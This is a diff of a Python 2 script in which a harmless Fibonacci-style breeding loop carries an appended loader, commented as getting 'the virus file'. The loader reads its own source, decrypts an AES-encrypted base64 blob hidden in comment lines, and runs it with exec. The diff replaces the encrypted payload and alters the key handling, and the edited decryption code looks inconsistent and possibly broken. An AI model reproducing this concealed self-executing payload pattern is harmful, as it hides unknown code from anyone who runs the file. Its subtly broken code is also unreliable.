@@ -2,6 +2,7 @@ parents, babies = (1, 1)
 while babies < 100:
     print 'This generation has {0} babies'.format(babies)
     parents, babies = (babies, parents + babies)
+
 ######################################################## First script python
 # coding=utf-8
 # Start Uncrypted
@@ -17,14 +18,12 @@ from Crypto import Random
 # Decryption function
 def decrypt(data):
    this = open(__main__.__file__, 'r')
-   key = this.readline()
-   this.close()
-
    data = base64.b64decode(data);
 
    iv = Random.new().read(AES.block_size)
-   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
+   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
    
+   this.close()
    return cipher.decrypt(data)[16:]
 
 # Gets the virus file
@@ -34,19 +33,19 @@ copy = False
 cipher_payload = ''
 
 for line in this:
-   if line.strip() == '#Start payload':
+   if line.strip() == '# Start payload':
       copy = True
-   elif line.strip() == '#End payload':
+   elif line.strip() == '# End payload':
       copy = False
    elif copy:
       cipher_payload = cipher_payload + line
 
 e = decrypt(cipher_payload[1:])
 #e = encrypt(cipher_payload)
-print e
+#print e
 exec e
 sys.exit('Good job!')
 # End Uncrypted
-#Start payload
-#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
-#End payload
+# Start payload
+#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
+# End payload
